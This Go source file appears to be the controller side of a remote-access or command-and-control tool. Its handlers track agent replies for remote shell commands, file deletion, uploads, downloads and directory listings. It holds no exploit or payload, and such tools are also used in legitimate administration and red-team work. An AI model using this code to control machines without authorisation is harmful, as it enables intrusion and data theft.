package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"strconv"
	"strings"
	"time"
)

// agent

func Shell_exec(ip string, content []byte) bool {
	// 解析数据
	var get_exec Get_Exec
	exec_data.Lock()
	if err := json.Unmarshal(content, &get_exec); err == nil {
		key := ip + "_" + get_exec.Hostname + "_" + get_exec.Operation
		// 把接收到的get_exec.data 放进task_buff里面
		if tasks_buff[key] == "" {
			tasks_buff[key] = get_exec.Data
		} else {
			tasks_buff[key] = tasks_buff[key] + get_exec.Data
		}
		if strings.HasSuffix(tasks_buff[key], ">") {
			exec_data.m[key] = tasks_buff[key]
			tasks_buff[key] = ""
			// 在task_send里寻找已完成的对应的任务
			for _, v := range tasks_send[ip] {
				var tmp Post_Exec
				if err := json.Unmarshal([]byte(v), &tmp); err == nil {
					// 判断返回的数据是exec中哪个任务对应的数据
					tmp.Data = strings.ReplaceAll(tmp.Data, `\`, `/`)
					if strings.Contains(exec_data.m[key], tmp.Data) {
						fmt.Println("找到该任务")
						tasks_send[ip] = remove_tasks_send(v, ip)
						exec_data.Unlock()
						return true
					} else {
						fmt.Println("未找到该任务")
						exec_data.m[key] = ""
						exec_data.Unlock()
						return false
					}
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_dir(ip string, content []byte) bool {
	var file_dir Get_Dir
	exec_data.Lock()
	// fmt.Println("content ", string(content))
	if err := json.Unmarshal(content, &file_dir); err == nil {
		// key := ip + "_" + file_dir.Hostname + "_" + file_dir.Operation + "_" + file_dir.Data
		key := ip + "_" + file_dir.Hostname + "_" + file_dir.Operation
		if file_dir.Status == "true" {

			tmp, _ := json.Marshal(analysis_dir_datas(file_dir.Folder))

			exec_data.m[key] = string(tmp)
			for _, v := range tasks_send[ip] {
				var tmp Post_Dir

				if err := json.Unmarshal([]byte(v), &tmp); err == nil {
					if tmp.Data == file_dir.Data {
						tasks_send[ip] = remove_tasks_send(v, ip)
						exec_data.Unlock()
						return true
					}
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_del_file(ip string, content []byte) bool {
	var del_file Get_Del_file
	exec_data.Lock()

	if err := json.Unmarshal(content, &del_file); err == nil {
		// key := ip + "_" + del_file.Hostname + "_" + del_file.Operation + "_" + del_file.Data
		key := ip + "_" + del_file.Hostname + "_" + del_file.Operation
		exec_data.m[key] = del_file.Status
		for _, v := range tasks_send[ip] {
			var tmp Post_Del_File
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.Data == del_file.Data {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_del_folder(ip string, content []byte) bool {
	var del_folder Get_Del_Folder
	exec_data.Lock()

	if err := json.Unmarshal(content, &del_folder); err == nil {
		// key := ip + "_" + del_folder.Hostname + "_" + del_folder.Operation + "_" + del_folder.Data
		key := ip + "_" + del_folder.Hostname + "_" + del_folder.Operation
		exec_data.m[key] = del_folder.Status
		for _, v := range tasks_send[ip] {
			var tmp Post_Del_Folder

			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.Data == del_folder.Data {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_upload(ip string, content []byte) bool {
	var upload Get_Upload
	exec_data.Lock()

	if err := json.Unmarshal(content, &upload); err == nil {
		// key := ip + "_" + upload.Hostname + "_" + upload.Operation + "_" + upload.File_Name
		key := ip + "_" + upload.Hostname + "_" + upload.Operation
		exec_data.m[key] = upload.Status
		for _, v := range tasks_send[ip] {
			var tmp Post_Upload
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.File_Name == upload.File_Name {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_download(ip string, content []byte) bool {
	var download Get_Download
	exec_data.Lock()

	if err := json.Unmarshal(content, &download); err == nil {

		// key := ip + "_" + download.Hostname + "_" + download.Operation + "_" + download.File_Name
		key := ip + "_" + download.Hostname + "_" + download.Operation
		d, err := json.Marshal(download)
		if err != nil {
			return false
		}
		// exec_data.m[key] = download.Status
		exec_data.m[key] = base64.StdEncoding.EncodeToString(d)
		for _, v := range tasks_send[ip] {
			var tmp Post_Upload
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				tmp.File_Name = strings.ReplaceAll(tmp.File_Name, `\`, `/`)
				// fmt.Println("tmp file name ", tmp.File_Name, "download file name ", download.File_Name)
				if tmp.File_Name == download.File_Name {
					// 下载文件
					write_file(download.File_Name, download.Data)
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			} else {
				fmt.Println("file download tmp json error")
				fmt.Println(err)
			}
		}
	} else {
		fmt.Println("file download json error")
		fmt.Println(err)
	}
	exec_data.Unlock()
	return false
}

func File_mkdir(ip string, content []byte) bool {
	var mkdir Get_Mkdir
	exec_data.Lock()
	// fmt.Println("content", string(content))
	if err := json.Unmarshal(content, &mkdir); err == nil {
		// key := ip + "_" + mkdir.Hostname + "_" + mkdir.Operation + "_" + mkdir.Data
		key := ip + "_" + mkdir.Hostname + "_" + mkdir.Operation
		exec_data.m[key] = mkdir.Status
		for _, v := range tasks[ip] {
			var tmp Post_Mkdir
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.Data == mkdir.Data {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_rename(ip string, content []byte) bool {
	var rename Get_Rename
	exec_data.Lock()
	if err := json.Unmarshal(content, &rename); err == nil {
		// key := ip + "_" + rename.Hostname + "_" + rename.Operation + "_" + rename.Old_File_Name
		key := ip + "_" + rename.Hostname + "_" + rename.Operation
		exec_data.m[key] = rename.Status
		for _, v := range tasks[ip] {
			var tmp Post_Rename
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.Old_Name == rename.Old_File_Name {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func File_list_drivers(ip string, content []byte) bool {
	var list_drivers Get_List_Driver
	exec_data.Lock()

	if err := json.Unmarshal(content, &list_drivers); err == nil {
		key := ip + "_" + list_drivers.Hostname + "_" + list_drivers.Operation
		exec_data.m[key] = list_drivers.Data
		for _, v := range tasks[ip] {
			var tmp Post_List_Drivers
			if err := json.Unmarshal([]byte(v), &tmp); err == nil {
				if tmp.Operation == list_drivers.Operation {
					tasks_send[ip] = remove_tasks_send(v, ip)
					exec_data.Unlock()
					return true
				}
			}
		}
	}
	exec_data.Unlock()
	return false
}

func Agent_sleep() {}

func Process() {}

// 读取文件并进行base64编码
func get_file_bin(path string) string {
	file_stream, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
	}

	encrypt_stream := my_base_encode(file_stream)

	return encrypt_stream
}

// 将file_stream写入文件
func write_file(file_name string, file_stream string) {

	tmp := strings.Split(file_name, "/")

	file_name = tmp[len(tmp)-1]

	var data = []byte(my_base_decode(file_stream))

	err := ioutil.WriteFile(download_path+file_name, data, 0666)
	if err != nil {
		panic(err)
	}
}

// 判断字符串是否在切片[]string中
func find_str(target_str string, target_slice []string) bool {
	for _, item := range target_slice {
		if item == target_str {
			return true
		}
	}
	return false
}

// 对dir中返回的folder数据进行处理
func analysis_dir_datas(datas string) map[string]string {
	// 将数据切割
	tmp := strings.Split(datas, "|")
	folder_data = make(map[string]string)

	for i := range tmp {
		flag := i % 2
		if flag == 0 {
			file_name := tmp[i]
			file_attr := tmp[i+1]
			tmp_attr := strings.Split(file_attr, ",")
			if tmp_attr[0] == "0" {
				file_type := "folder"
				file_high, _ := strconv.ParseInt(tmp_attr[1], 10, 64)
				file_low, _ := strconv.ParseInt(tmp_attr[2], 10, 64)
				high, _ := strconv.ParseInt(tmp_attr[3], 10, 64)
				low, _ := strconv.ParseInt(tmp_attr[4], 10, 64)

				folder_data[file_name] = file_type + "," + string(trans_time(high, low)+","+trans_size(file_high, file_low))
			} else {
				file_type := "file"
				file_high, _ := strconv.ParseInt(tmp_attr[1], 10, 64)
				file_low, _ := strconv.ParseInt(tmp_attr[2], 10, 64)
				high, _ := strconv.ParseInt(tmp_attr[3], 10, 64)
				low, _ := strconv.ParseInt(tmp_attr[4], 10, 64)

				folder_data[file_name] = file_type + "," + string(trans_time(high, low)+","+trans_size(file_high, file_low))
			}
			//folder_data[file_name] = file_attr
			// if i < len(tmp)-3 {
			// 	i = i + 2
			// } else {
			// 	break
			// }
			if i >= len(tmp)-3 {
				break
			}
		}
	}

	return folder_data
}

// 处理windows file_time
func trans_time(high int64, low int64) string {
	var timeLayoutStr = "2006-01-02 15:04:05"
	high <<= 32
	input := high + low
	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	d := time.Duration(input)
	for i := 0; i < 100; i++ {
		t = t.Add(d)
	}
	tmp := t.Format(timeLayoutStr)
	return tmp
}

// 处理windows file_size
func trans_size(high int64, low int64) string {

	high <<= 32
	size := high + low
	size = size / 1024

	return strconv.FormatInt(size, 10) + "kb"
}
